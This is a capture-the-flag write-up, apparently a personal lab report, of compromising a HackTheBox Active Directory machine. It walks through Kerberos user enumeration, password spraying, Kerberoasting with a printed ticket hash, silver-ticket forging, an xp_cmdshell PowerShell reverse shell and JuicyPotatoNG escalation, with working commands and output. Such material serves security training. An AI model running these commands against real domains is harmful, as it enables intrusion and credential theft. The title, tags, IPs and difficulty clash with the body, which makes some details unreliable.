@@ -1,0 +1,711 @@
+title	HTB — Forest Writeup
+date	2025-06-25
+categories	
+HackTheBox
+Easy
+tags	
+AS-REP Roasting
+BloodHound
+DCSync
+Windows
+AD
+
+
+### Scoup
+
+| **Target IP** | 10.129.17.203 |
+| --- | --- |
+| **Domain** | scrm.local / DC1.scrm.local |
+| **OS** | Windows Server + Active Directory |
+| **Difficulty** | Medium |
+| **Date** | June 2026 |
+| **Author** | Red Team Operator |
+
+---
+
+## 1. Executive Summary
+
+---
+
+This report documents the complete compromise of 'Scrambled' Windows Active Directory machines on HackTheBox. The environment had NTLM disabled, making a specific exception for Kerberos — a non-trivial configuration that requires protocol specifics.
+
+Attack Chain:
+• Credential Discovery from Web Page Enumeration + Image Metadata
+• Kerberosting of SqlSvc Account → Offline Crack → Pegasus60
+• Silver Ticket Attack to Impersonate Administrator to MSSQL
+• RCE via xp_cmdshell → Reverse Shell as sqlsvc
+• Privilege Escalation: SeImpersonatePrivilege + JuicyPotatoNG → SYSTEM
+
+| **RESULT** | Complete compromise — NT AUTHORITY\SYSTEM |
+| --- | --- |
+
+## 2. **Attack Chain Diagram**
+
+---
+
+The diagram below shows the attack steps from initial enumeration to SYSTEM access:
+
+!2026-06-25 14_28_50-Greenshot.png
+
+Complete kill chain table with MITER ATT&CK mapping:
+
+| **Tactic** | **Technique** | **MITRE ID** |
+| --- | --- | --- |
+| Reconnaissance | Web enum, metadata, kerbrute user enum | T1592, T1589 |
+| Initial Access | Password spray → ksimpson:ksimpson | T1078 |
+| Credential Access | Kerberoasting SqlSvc → crack offline | T1558.003 |
+| Lateral Movement | Silver Ticket → MSSQL si Administrator | T1550.003 |
+| Execution | xp_cmdshell → PowerShell reverse shell | T1059.001 |
+| Privilege Escalation | SeImpersonatePrivilege + JuicyPotatoNG | T1134.001 |
+| Impact | NT AUTHORITY\SYSTEM  | T1078.002 |
+
+## 3. Reconnaisance & Initial Enumeration
+
+---
+
+### 3.1 Port Scan Nmap
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| Nmap gives us a complete picture of the attack surface. Before you attack, you need to know what the machine is listening for. Any open port can be a potential attack vector. | Use -sC (default scripts)  -sV (version detection) for maximum information. The -p- flag scans all 65535 ports, because hidden services are often on non-standard ports. |
+
+```bash
+**nmap -sC -sV -T4 -p- 10.129.17.203                          
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 17:54 -0400
+Nmap scan report for 10.129.17.203
+Host is up (0.057s latency).
+Not shown: 65513 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Scramble Corp Intranet
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-17 21:57:15Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-06-17T21:52:05
+|_Not valid after:  2056-06-17T21:52:05
+|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.129.17.203:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+4411/tcp  open  found?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|     SCRAMBLECORP_ORDERS_V1.0.3;
+|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
+|     SCRAMBLECORP_ORDERS_V1.0.3;
+|_    ERROR_UNKNOWN_COMMAND;
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49703/tcp open  msrpc         Microsoft Windows RPC
+49720/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4411-TCP:V=7.99%I=7%D=6/17%Time=6A33183B%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
+SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
+SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
+SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
+SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
+SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
+SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
+SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
+SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
+SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
+SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
+SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
+SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
+SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
+SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
+SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
+SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
+SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
+SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
+SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
+SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
+SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
+SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
+SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
+SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-06-17T21:59:47
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required**
+
+```
+
+Domain : `scrm.local` & **`DC1.scrm.local`**
+
+Prioritize important ports for scanning
+
+- 53      /  domain
+- 80      /  http
+- 88      /  kerberos-sec
+- 389    / ldap
+- 445     / microsoft-ds?
+- 1433   /   ms-sql-s
+- 4411    /  found?     SCRAMBLECORP_ORDERS_V1.0.3
+- 5985   /    http
+
+| **📚 LESSON LEARNED — Attack Surface Reading** |
+| --- |
+| Port 4411 with the banner 'SCRAMBLECORP_ORDERS_V1.0.3' immediately indicated a custom application. Custom applications are usually much more vulnerable than commercial software as they rarely pass security audits. When I see unusual ports, I note them for later analysis. |
+
+---
+
+### 3.2 SMB - NTLM Disabled Confirmed
+
+Me serbimin SMB nuk mund te lidhemi !!!
+
+```bash
+ smbclient -L //10.129.19.42 -U ''
+session setup failed: NT_STATUS_NOT_SUPPORTED
+```
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| SMB is usually the first attack vector on Windows. The anonymous connection attempt immediately tells us whether NTLM is active or not. | We attempt an anonymous connection (null session). If we get NT_STATUS_NOT_SUPPORTED, NTLM is confirmed disabled. This means that all communication must be done via Kerberos — a different protocol with different attack mechanisms. |
+
+| **📚 LESSON LEARNED — NTLM vs Kerberos - Impact on Attack Strategy** |
+| --- |
+| With NTLM disabled, classic attacks like Pass-the-Hash and NTLM Relay are impossible. But Kerberos opens up other vectors: AS-REP Roasting, Kerberoasting, Silver/Golden Ticket attacks. This configuration is not necessarily 'more secure' — it just requires different knowledge from the attacker. |
+
+### 3.3 Web Enumeration - Credential Disclosure
+
+1. Verify that NTLM is disable from a message we find in the web
+
+!2026-06-20 10_46_20-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+### 3.4 Let's better understand the difference between NTLM and Kerberos
+
+---
+
+### 3.5 What does NTLM do?(New Technology LAN Manager) ?
+
+### **Authentication flow:**
+
+1. Client sends the username & password to the server.
+2. Server sends back a random 8 byte  challenger (nonce)
+3. Client uses the password hash to generate a response to the challenge.
+4. Server verifies the response using its stored password hash.
+5. If the responses match, access is granted.
+
+#### **Advantages**
+
+- Does not require Active Directory.
+- Backward compatible with legacy systems.
+- Simple to deploy and widely supported.
+
+#### Disadvantages
+
+- Less secure than Kerberos.
+- Vulnerable to Pass-the-Hash attacks.
+- Vulnerable to NTLM Relay attacks.
+- Password hashes can be cracked if obtained by an attacker.
+
+### 3.6 Kerberos
+
+Kerberos is the primary authentication protocol in Active Directory.
+
+#### When a user authenticates:
+
+1. The client sends a request to the **Key Distribution Center (KDC)** on the Domain Controller.
+2. The KDC verifies the user's identity.
+3. The KDC issues a **Ticket Granting Ticket (TGT)**.
+4. The client uses the TGT to request a **Ticket Granting Service Ticket (TGS)** for a specific service.
+5. The client presents the TGS to the requested service to authenticate without resending the password.
+
+**TGT (Ticket Granting Ticket)**
+• It is received once when you log in to the domain.
+
+**TGS (Ticket Granting Service)**
+• It is required every time you want to access a specific service (MSSQL, SMB, HTTP, etc.).
+
+#### Advantages
+
+- More secure than NTLM.
+- Uses tickets instead of transmitting passwords.
+- Supports Single Sign-On (SSO).
+- Provides Mutual Authentication.
+- More resistant to relay attacks.
+
+#### Disadvantages
+
+- Requires precise time synchronization between clients and the Domain Controller.
+- Depends on KDC/Domain Controller availability.
+- Configuration and troubleshooting can be more complex than NTLM.
+
+Let's continue where we left off.
+
+1. We also discover an email  : support@scramblecorp.com 
+
+WE have a user `support`and a phone number `0866`
+
+!2026-06-20 11_31_02-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+1. We reveal a username in a screenshot `ksimpson`
+
+!2026-06-20 11_15_49-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+On the Web we copy the image link and download the image.
+
+```bash
+wget 'http://10.129.19.42/images/ipconfig.jpg
+```
+
+Using `exiftool` to extract metadata from a photo
+
+```bash
+exiftool ipconfig.jpg
+```
+
+!2026-06-20 11_28_43-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+We see that it was last modified at: `2021:11:03`
+
+The author is `VbScrub` , it could be another user.
+
+| **📚 LESSON LEARNED — OSINT from Metadata** |
+| --- |
+| JPEG and PNG images retain EXIF metadata such as: author, software used, modification date, and even GPS coordinates if taken with a mobile phone. Companies rarely 'clean' images before publishing. |
+
+## 3.7 What have we discovered so far ???
+
+- NTLM is disabled
+- 0866 IT Support Number
+- Users Name
+    1. support
+    2. ksimpson
+    3. VbScrub
+
+Now what can we do ???
+
+---
+
+## 4. Initial Access - **Username Enum & Password Spray**
+
+---
+
+### **4.1 User Enumeration me Kerbrute**
+
+We use kerbrute to collect all the usernames that occur in the system with a list username `jsmith.txt`
+
+| **🎯 Why this work** | **⚙️ How this work** |
+| --- | --- |
+| Kerbrute exploits the fact that Kerberos returns different errors for usernames that exist vs. those that do not (KDC_ERR_C_PRINCIPAL_UNKNOWN). This allows us to enumerate VALID accounts without triggering account lockouts and without requiring a password. | We send AS-REQ (Authentication Service Request) for each username in the list. The DC's KDC returns a specific error if the username does not exist. If it does, it returns another error (even without a password). This difference allows us to filter out valid usernames. |
+
+```bash
+./kerbrute_linux_amd64 userenum -d scrm.local --dc 10.129.19.42 jsmiht.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/20/26 - Ronnie Flathers @ropnop
+
+2026/06/20 06:34:29 >  Using KDC(s):
+2026/06/20 06:34:29 >   10.129.19.42:88
+
+2026/06/20 06:34:30 >  [+] VALID USERNAME:       asmith@scrm.local
+2026/06/20 06:34:31 >  [+] VALID USERNAME:       jhall@scrm.local
+2026/06/20 06:34:41 >  [+] VALID USERNAME:       sjenkins@scrm.local
+2026/06/20 06:34:46 >  [+] VALID USERNAME:       ksimpson@scrm.local
+2026/06/20 06:34:56 >  [+] VALID USERNAME:       khicks@scrm.local
+```
+
+We find  5 usernames.
+
+### 4.2 Password Spray
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| Many organizations have weak password policies. Common bad practice: users set their username as their password. Password spray (not bruteforce) tests 1 password against many usernames — avoiding lockouts. | We create a list with the format username:username for each account. Kerbrute tests via Kerberos without triggering lockouts. |
+
+We modify the list
+
+```bash
+support:support
+ksimpson:ksimpson
+VbScrub:VbScrub
+asmith:asmith
+jhall:jhall
+sjenkins:sjenkins
+kthicks:kthicks
+```
+
+And we find the credencial `ksimpson`:`ksimpson`
+
+```bash
+./kerbrute_linux_amd64 bruteforce --dc dc1.scrm.local -d scrm.local username.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/22/26 - Ronnie Flathers @ropnop
+
+2026/06/22 06:39:41 >  Using KDC(s):
+2026/06/22 06:39:41 >   dc1.scrm.local:88
+
+2026/06/22 06:39:41 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
+2026/06/22 06:39:41 >  Done! Tested 7 logins (1 successes) in 0.248 seconds
+```
+
+| **📚 LESSON LEARNED — Why PAssword Spray and not BruteForce** |
+| --- |
+| Account lockout policies typically lock an account after 3–5 failed authentication attempts.
+
+Password Spraying tests a common password against all logged-in usernames before trying a different password. This helps keep the number of attempts for each individual account below the lockout threshold.
+
+When possible, verify the lockout policy  `Get-ADDefaultDomainPasswordPolicy` before performing a password spray. |
+
+---
+
+## 5. Kerberoasting
+
+---
+
+> Kerberosting is an attack against AD accounts that have Service Principal Names (SPNs) configured. Any domain user can request a TGS ticket for any SPN — the ticket is encrypted with the hash of the service account and can be cracked offline.
+> 
+
+### 5.1Getting a TGT Ticket
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| With NTLM disabled, we cannot authenticate directly with standard tools. We need a TGT (Kerberos ticket) first, which then serves as a 'passport' to request other services like GetUserSPNs. | impacket's getTGT.py retrieves the TGT from the KDC using ksimpson's credentials. It is stored in .ccache (Kerberos Credential Cache) format. The KRB5CCNAME variable tells other tools where to find the ticket. |
+
+```bash
+python3 getTGT.py scrm.local/ksimpson:ksimpson  
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ksimpson.ccache
+
+export KRB5CCNAME=ksimpson.ccache
+```
+
+### 5.2 SPN discovery and Kerberosting
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| Kerberosting works because: (1) Any domain user can request a TGS ticket for any SPN. (2) The TGS is encrypted with the NTLM hash of the service account. (3) We can break it offline without alerting the system. RC4 encryption is very weak and is easily broken with hashcat. | GetUserSPNs.py requests the KDC TGS ticket for the SPNs found. The -request flag returns the ticket hash in hashcat ready format (krb5tgs).  |
+
+We see the users who have SPN in the system
+
+```bash
+./GetUserSPNs.py scrm.local/ksimpson -dc-host  dc1.scrm.local -k
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
+
+```
+
+Use `-no-passs -request` to request the hash 
+
+```bash
+./GetUserSPNs.py scrm.local/ksimpson -dc-host  dc1.scrm.local -k -no-pass -request
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
+
+$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$721cf65c2cab60aff172ab92020f677c$f94798e6a817c0c161eed7a335ecc45db23132dfe47ce117171479835b5513d38402ffad501b70eedaafd5948758215ef2e75ce2334ef0e353fdf47b799557486505b01dccb9ab60dee4c8d9e613312c140d5b8208337d178ed868b403e21199e4a45b4924a2939f5200ee26f41ef3bb764fd0921bedaa5d21054ef56dbadbcde972d9981d839eb794b5866952cf1add15cb7744877c549a18c7aca91f4507273ce22af2a85d53a32f12f25a7b80679471b5e42bd889866cb6beb3ab6c3e5ca428de31d209cc68ab898bc8b72c0a5206a28f96bddcb5ec92e53d9dddaa20e74d85d96e21cc4385ad7aea7d8ad68d71c301d7aabe792b59fde0e1b3d98cc1f226fcb2f966da0b070e71f1b88d8c1a6ed3fb832909901c3b8e433afa808455f14b5c47aceb2e98119abca08745754d435fb6371b855da63e108de558015637c183c956aab099758a1b7fea840832b68ff98ddb759cc1fa733f9f9b580a95940149ad4eff1491fdd48fe17315df28b4b9d53bea515dc6b55a0061cb568be18d32b6684138b6b7218965cd6cd6e679fe43908a42b343825836fe52af1fb62cd3689f58ed5e568029026b2775916aac7ba6eee8289e4dc2fe69da43c9934c476116842b3eccf754d7581c3e8581560734960ff6fe3e8392e6698c22e4f53fc49fdaba8cb26569e6778d1975d190273a0059ce99b5af9d5ce83fea01cfc72947cd22fa69d1766876d9064828aea0585c0d88f9f3b665d2ddadf2f2719bbe3a1ecec962d0bdd2e99bfd2534de436ab3434d8e3df6f1bdd047d31c41a0c20744626bd9337d9a8588596c13c379238a3e7b0737a9f08839c388fddbd5dc78f7a00cb4d4ac46427a44da179c1de3c503f9b24a1726b543b6555c7c2792babe05fdcc96ad59b9a04ff443fecdb886c4b4c5219db5c28636570030d6182cf97af7b1a6a700e0d7ebb565b2452d80724f326818045c5b838804f08fe96a0cafab13fccdeda1763bcc1cb7afe4d1ab9d14bdbc3aafe2259eefd2ee393aec57691505a4e9a3766b3e0094b2036e08bc661f16c19a1c6afd35cff30fda5e1ff0a3cf457270359646feafab351932feb94b5328acd73ca1a9aa0478138a38fe7eaf6d940596c7661d6d10f72b7ca2b8f0f519de59cbe64cb591d0d4a6d0d24fe22fc40b3d4fc5d17f987dbd479a6def9dd03852bbb7075f297d3314fbad7cc2ef99ebdad552772dd08b680a0030269cb063d19b18fd650b1e5cd4b12f491067831603ba13af86d6768b087d0454d5010190398b78205f341a78024f41d68e4865a5767e2787375f0493dc3655360bca77218940d74c7718c30ddc28734e5f819d0076f94afe9a48bc5606ee8ca28a5fb6daa46640e6119b349e280c057e004d7308b4e45d40dc16f0cad398dbbb166a0f7abc60c048fe3476d8cf032665cdf629a744cf
+
+```
+
+| **📚 LESSON LEARNED — RC4 Hash** |
+| --- |
+| The hash type $krb5tgs$23$ indicates a Kerberos TGS-REP encrypted with RC4-HMAC (etype 23).
+
+This algorithm is considered weaker than AES (AES128/AES256), and if the user's password is weak, the hash can be cracked offline during Kerberosing.
+
+In modern Active Directory environments, it is recommended to use AES encryption for Kerberos for higher security.
+
+This activity can be monitored via Event ID 4769 (Kerberos Service Ticket Request). |
+
+### **5.3 Hash Cracking me Hashcat**
+
+| **🎯 Why** | **⚙️ How** |
+| --- | --- |
+| Offline cracking is the main advantage of Kerberosting. The attack happens on our machine, not on the DC so there is no risk of detection. | Hashcat mode 13100 is used to crack Kerberos TGS-REP tickets encrypted with RC4-HMAC (etype 23), commonly obtained during Kerberoasting attacks.
+
+We use the rockyou.txt wordlist to attempt password cracking against the extracted hash. |
+
+We break the hash with hashcat and discover the password
+
+```bash
+hashcat -m 13100 -a 0  hash.txt rockyou.txt
+
+# Password
+Pegasus60
+```
+
+### 5.4 So let's summarize what we've discovered so far.
+
+Credentials for users like :
+
+- ksimpson : ksimpson
+- sqlsvc: Pegassu60
+- SPN - MSSQLSvc/dc1.scrm.local
+
+---
+
+## 6. Silver Ticket
+
+---
+
+- Silver Ticket Attack allows an attacker to forge TGS tickets for specific services using the service account’s password hash
+- The ticket is created locally on the attacker’s machine and is then used to access the target service without interacting with the Domain Controller.
+- Since Silver Tickets are forged offline and do not require communication with the KDC, they do not generate standard Kerberos TGS requests (Event ID 4769) on the Domain Controller, making them harder to detect through typical DC logging.
+
+1. **We cannot connect to MSSQL using these credentials.**
+2. **We will create a Silver Ticket and forge a ticket for the Administrator.**
+
+**What do we need to create a silver ticket?**
+
+- NTLM Hash
+- Domain Name
+- Domain SID
+- SPN
+- Username & RID
+
+1. **Silver Ticket requires NTLM hash and we will convert the password to a hash.**
+
+Pegasus60 :  `b999a16500b87d17ec7f2e2a68778f05`
+
+### **6.1 Getting Domain SID**
+
+```bash
+python3 getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson 
+
+Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+```
+
+### 6.2 Creating Silver Ticket
+
+```bash
+ python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving/Updating ticket in Administrator.ccache
+```
+
+**Sets the KRB5CCNAME environment variable, which tells Kerberos applications where the Kerberos credential cache is located**
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+**Let's see in the ccache that the ticket expires in 10 years ???? This is another weakness**
+
+```bash
+klist 
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@SCRM.LOCAL
+
+Valid starting       Expires              Service principal
+06/22/2026 06:44:11  06/22/2026 16:44:11  krbtgt/SCRM.LOCAL@SCRM.LOCAL
+        for client ksimpson@SCRM.LOCAL, renew until 06/23/2026 06:44:11
+06/22/2026 07:26:34  06/19/2036 07:26:34  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
+        renew until 06/19/2036 07:26:34
+```
+
+## 6.3 Log in to MySQL like Administrator
+
+Pastaj perdorim bileten e vendosur ne cache per te marr akses ne databazen sql
+
+```bash
+KRB5CCNAME='/home/kali/Desktop/Administrator.ccache' python3 examples/mssqlclient.py -k -no-pass dc1.scrm.local
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SCRM\administrator  dbo@master)> 
+```
+
+## 7. Remote Code Execution via MSSQL
+
+---
+
+### 7.1 xp_cmdsh
+
+Gjeja e par kur hym ne nje SQL provojm `xp_cmdshell` po ne kemi akses administratori dhe mund ta ndezim.
+
+!2026-06-23 14_44_28-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+| **🎯 Why is it Dangerous** | **⚙️ How it Work** |
+| --- | --- |
+| xp_cmdshell is a SQL Server stored procedure that executes commands directly. But administrators often enable it for automation — and forget to disable it. | As an MSSQL administrator, we possess `sysadmin` role privileges. This allows for the modification of configurations such as `xp_cmdshell`. |
+
+### 7.2 Reverse Shell via Powershell
+
+**We create a Shell Revere for Powershell and encode it in base64.**
+
+```bash
+# Let's start the listener in our car.
+nc -lvnp 9001
+
+# Execute the payload
+xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA....
+```
+
+And we have akses in the sistem.
+
+!2026-06-24 11_37_00-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+## 8. Privilege Escalation
+
+---
+
+**We see that in the system we have `SeImpersonatePrivilege` Enable and we can use it for PRivEsc**
+
+!2026-06-24 11_57_05-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+### 8.1 SeImpersonatePrivilege - What Is?
+
+| **🎯 Why is Dangers** | **⚙️ How this work** |
+| --- | --- |
+| The ImpersonatePrivilege allows a process to 'impersonate' the token of other processes. Service accounts (IIS, MSSQL, etc.) | Tools like : (JuicyPotato, RoguePotato, JuicyPotatoNG) exploit SeImpersonatePrivilege: (1) Create a rogue COM server, (2) Force SYSTEM to connect to the server, (3) Capture the SYSTEM token, (4) Call CreateProcessAsUser() with the captured token — resulting in a SYSTEM shell. |
+
+### 8.2 JuicyPotatoNG Exploit
+
+| **🎯 PERSE (Why)** | **⚙️ SI (How)** |
+| --- | --- |
+| JuicyPotatoNG është versioni i ri i JuicyPotato, i cili patch-on disa CLSID-të e vjetra. Funksionon duke abuzuar DCOM dhe NTLM reflection/relay lokale. Versioni NG ka gjetur CLSID-të e reja që funksionojnë edhe në Windows Server 2019. | We download the executable and create a .bat file containing the reverse shell payload. The .bat file is executed by JuicyPotatoNG as NT AUTHORITY\SYSTEM via CreateProcessAsUser(). |
+
+Download **`JuicePotatoNG` .**
+
+!2026-06-24 11_58_19-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
